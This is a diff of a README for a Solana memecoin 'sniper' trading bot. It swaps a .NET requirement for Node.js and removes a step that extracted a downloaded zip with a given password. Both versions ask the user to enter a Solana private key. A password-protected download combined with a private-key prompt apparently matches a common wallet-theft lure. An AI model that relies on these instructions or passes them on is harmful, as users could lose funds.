@@ -23,14 +23,18 @@ Through its automated processes and lightning-fast decision-making capabilities,
 
 #### Requirements
 - Windows 7/10/11
-- .Net Framework 4.5
+- Node.js
 - RPCs for each network (ex. shyft.to)
   
 #### Installation Guide
 Include detailed instructions on how to install and set up the bot:
-1. [Clone](https://github.com/origami-xyz/shitcoin-sniper-bot/archive/refs/heads/main.zip) the repository realease and extract files with password `6aWmUtTAA`.
+1. [Clone](https://github.com/origami-xyz/shitcoin-sniper-bot/archive/refs/heads/main.zip) the repository realease and extract files.
 2. Input your Solana private key. Ensure that you do not utilize your primary account or seed phrase.
 3. Start the bot.
+```
+npm install
+node index.js
+```
    
 #### Usage
 Explain how to use the bot effectively:
